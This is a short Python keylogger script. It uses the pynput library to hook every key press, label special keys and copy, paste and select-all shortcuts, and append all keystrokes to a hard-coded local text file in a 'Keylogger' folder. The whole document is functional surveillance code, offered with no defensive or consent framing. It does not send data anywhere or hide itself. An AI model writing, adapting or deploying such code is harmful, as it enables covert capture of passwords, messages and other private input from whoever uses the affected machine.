from pynput.keyboard import Listener

def keystroke(key):
    key = str(key).replace("'","")
    
    if key == "Key.backspace":
        key = '\n' + key + '\n'
    if key == "Key.space":
        key = '\n' + key + '\n'
    if key == "Key.enter":
        key = '\n' + key + '\n'
    if key == "Key.space":
        key = '\n' + key + '\n'
    if key == "\\x03":
        key = "\nshortcut Copy\n"
    if key == "\\x16":
        key = "\nshortcut Paste\n"
    if key == '\\x01':
        key = "\nshortcut All\n"
    if key == "Key.ctrl_l":
        key = '\n' + key + '\n'
    else:
        key += ' '
    
    with open("C:\\Projecttemp\\Temp\\Keylogger\\Keylogger.txt", 'a') as f:
        f.write(key)

with Listener(on_press=keystroke) as l:
    l.join()
